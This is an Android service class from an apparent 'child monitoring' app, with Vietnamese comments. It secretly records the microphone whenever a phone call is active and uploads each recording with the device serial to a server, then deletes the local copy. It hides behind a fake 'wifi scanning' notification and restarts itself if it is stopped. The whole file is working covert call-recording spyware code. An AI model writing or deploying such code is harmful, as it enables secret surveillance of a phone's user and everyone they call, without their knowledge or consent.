package com.ChildMonitoringSystem.CMS.JobService;

import static com.ChildMonitoringSystem.CMS.MyApplication.CHANNEL_ID;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.ChildMonitoringSystem.CMS.BroadCast.Helper;
import com.ChildMonitoringSystem.CMS.BroadCast.Restarter_Service;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadInfoAppFromDevice;
import com.ChildMonitoringSystem.CMS.Model.INFO_IMAGE;
import com.ChildMonitoringSystem.CMS.R;
import com.ChildMonitoringSystem.CMS.Service.Service_Upload;
import com.ChildMonitoringSystem.CMS.Value.Constant;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class AudioService extends Service {
    private MediaRecorder mediaRecorder;
    boolean isRecord;
    private INFO_IMAGE lst;

    @Override
    public void onCreate() {
        super.onCreate();
        // Khởi tạo Service
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
        //Đăng ký lắng nghe sự kiện khi có cuộc gọi
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.PHONE_STATE");
        registerReceiver(receiver, filter);
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground() {
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Trình quản lí mạng")
                .setContentText("Hệ thống đang quét wifi gần bạn")
                .setSmallIcon(R.drawable.ic_baseline_settings_24)
                .build();
        startForeground(2, notification);
    }


    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //Đăng ký nhận sự kiện khi có cuộc gọi
            if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                Intent intent1 = new Intent(context, AudioService.class);
                intent1.putExtra("action", 1);
                context.startService(intent1);
            }
            //Đăng ký nhận sự kiện khi có cuộc gọi kết thúc
            else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                Intent intent1 = new Intent(context, AudioService.class);
                intent1.putExtra("action", 0);
                context.startService(intent1);
            }
        }
    };

    //Hàm ghi audio
    private void StartRecoding() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                if (!isRecord) {
                    isRecord = true;
                    Log.i("TAG", "StartRecoding: ");
                    String recordPath = getExternalFilesDir("/").getAbsolutePath();
                    Date date = new Date();
                    SimpleDateFormat simple = new SimpleDateFormat(Constant.pattern_date_name);
                    SimpleDateFormat simple1 = new SimpleDateFormat(Constant.pattern);
                    String recordfile = "Record_" + simple.format(date) + ".3gp";
                    String filePath = recordPath + "/" + recordfile;
                    lst = new INFO_IMAGE(filePath, Constant.Serial(getApplicationContext()), simple1.format(date), null);
                    mediaRecorder = new MediaRecorder();
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    mediaRecorder.setOutputFile(filePath);
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    try {
                        mediaRecorder.prepare();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    mediaRecorder.start();
                }

            }
        }).start();
    }
    //Hàm dùng ghi
    private void StopRecoding() {
        if (isRecord) {
            Log.i("TAG", "StopRecoding: ");
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            if (Helper.Checknetwork(getApplicationContext())) {
                SendToserver();
                isRecord = false;
            }
            isRecord = false;

        }

    }
    //Hàm gửi file ghi âm lên Server
    private void SendToserver() {
        new Thread(() -> {
            String seri = lst.getSERI_PHONE();
            String day = lst.getDATE_IMAGE();
            RequestBody requestBodySeri = RequestBody.create(MediaType.parse("multipart/form-data"), seri);
            RequestBody requestBodyDate = RequestBody.create(MediaType.parse("multipart/form-data"), day);
            File file = new File(lst.getIMAGES_NAME());
            RequestBody requestBodyimg = RequestBody.create(MediaType.parse("*/*"), file);
            MultipartBody.Part mPart = MultipartBody.Part.createFormData(Constant.KEY_Img, file.getName(), requestBodyimg);
            Service_Upload.apiservice1.UploadAudio(requestBodySeri, requestBodyDate, mPart).enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    LoadInfoAppFromDevice.deleteDirectory(file);
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    String err = t.getMessage() == null ? "" : t.getMessage();
                    Log.i("TAG", "onFailure: " + err);
                }
            });
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        int action = intent.getIntExtra("action", 2);
        if (action == 1)
            StartRecoding();
        else if (action == 0) {
            StopRecoding();

        } else
            Log.i("TAG", "onStartCommand: ");

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction(Constant.ALL_SERVICE);
        broadcastIntent.setClass(this, Restarter_Service.class);
        this.sendBroadcast(broadcastIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
